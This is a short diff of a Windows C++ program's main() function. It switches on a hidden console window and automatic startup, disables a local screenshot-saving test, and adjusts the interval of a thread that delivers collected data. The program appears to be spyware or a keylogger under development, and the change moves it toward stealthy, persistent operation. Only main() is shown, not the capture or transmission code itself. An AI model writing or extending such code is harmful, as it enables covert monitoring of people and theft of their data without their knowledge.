@@ -353,12 +353,12 @@ int main()
     //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
     SetProcessDPIAware();
     SetConsoleOutputCP(CP_UTF8);
-    //hideConsoleWindow();
+    hideConsoleWindow();
 
-    //addToAutostart();
+    addToAutostart();
 
-    std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
-    lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");
+    /*std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
+    lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");*/
 
 
 
@@ -375,7 +375,7 @@ int main()
 
     DataTransmission dt = DataTransmission();
 
-    std::thread delivery(deliveryThread,std::ref(dt),5);
+    std::thread delivery(deliveryThread,std::ref(dt),10);
     while (GetMessage(NULL, NULL, 0, 0));
 
 
